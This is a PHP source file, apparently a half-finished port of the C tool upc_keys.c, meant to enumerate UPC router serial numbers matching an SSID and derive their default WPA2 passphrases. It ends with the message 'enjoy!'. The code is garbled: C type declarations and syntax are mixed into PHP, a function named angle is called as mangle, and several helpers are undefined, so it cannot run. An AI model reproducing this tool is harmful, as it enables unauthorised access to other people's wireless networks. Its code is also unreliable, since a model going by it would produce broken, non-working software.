<?php
	// Adapted from blasty <peter@haxx.in> upc_keys.c
	$MAGIC_24GHZ = hexdec("ffd9da60");
	$MAGIC_5GHZ = hexdec("ff8d8f20");
	$MAGIC0 = hexdec("b21642c9ll");
	$MAGIC1 = hexdec("68de3afll");
	$MAGIC2 = hexdec("6b5fca6bll");

	$MAX0 = 9;
	$MAX1 = 99;
	$MAX2 = 9;
	$MAX3 = 9999;

	function hash2pass( $in_hash ){
		$i, $a;
		$out_pass

		for ($i = 0; $i < 8; $i++) {
			$a = $in_hash[i] & 0x1f;
			$a -= (($a * $MAGIC0) >> 36) * 23;

			$a = ($a & 0xff) + 0x41;

			if ($a >= 'I') $a++;
			if ($a >= 'L') $a++;
			if ($a >= 'O') $a++;

			$out_pass[$i] = $a;
		}
		$out_pass[8] = 0;
		return $out_pass;
	}

	function angle( $pp ){
		$a, $b;

		$a = (($pp[3] * $MAGIC1) >> 40) - ($pp[3] >> 31);
		$b = ($pp[3] - $a * 9999 + 1) * 11ll;

		return $b * ($pp[1] * 100 + $pp[2] * 10 + $pp[0]);
	}

	function upc_generate_ssid( $data, $magic ){
		$a, $b;

		$a = $data[1] * 10 + $data[2];
		$b = $data[0] * 2500000 + $a * 6800 + $data[3] + $magic;

		return $b - ((($b * $MAGIC2) >> 54) - ($b >> 31)) * 10000000;
	}

	function main( $argc, $argv){
		uint32_t buf[4], target;
		char serial[64];
		char pass[9], tmpstr[17];
		uint8_t h1[16], h2[16];
		uint32_t hv[4], w1, w2, i, cnt=0;

		banner();

		if(argc != 2) {
			usage(argv[0]);
			return 1;
		}

		target = strtoul(argv[1] + 3, NULL, 0);

		MD5_CTX ctx;

		for (buf[0] = 0; buf[0] <= MAX0; buf[0]++)
		for (buf[1] = 0; buf[1] <= MAX1; buf[1]++)
		for (buf[2] = 0; buf[2] <= MAX2; buf[2]++)
		for (buf[3] = 0; buf[3] <= MAX3; buf[3]++) {
			if(upc_generate_ssid(buf, MAGIC_24GHZ) != target &&
				upc_generate_ssid(buf, MAGIC_5GHZ) != target) {
				continue;
			}

			cnt++;

			sprintf(serial, "SAAP%d%02d%d%04d", buf[0], buf[1], buf[2], buf[3]);

			MD5_Init(&ctx);
			MD5_Update(&ctx, serial, strlen(serial));
			MD5_Final(h1, &ctx);

			for (i = 0; i < 4; i++) {
				hv[i] = *(uint16_t *)(h1 + i*2);
			}

			w1 = mangle(hv);

			for (i = 0; i < 4; i++) {
				hv[i] = *(uint16_t *)(h1 + 8 + i*2);
			}

			w2 = mangle(hv);

			sprintf(tmpstr, "%08X%08X", w1, w2);

			MD5_Init(&ctx);
			MD5_Update(&ctx, tmpstr, strlen(tmpstr));
			MD5_Final(h2, &ctx);

			hash2pass(h2, pass);
			printf("  -> WPA2 phrase for '%s' = '%s'\n", serial, pass);
		}

		printf("\n  \x1b[1m=> found %u possible WPA2 phrases, enjoy!\x1b[0m\n\n", cnt);

		return 0;
	}

?>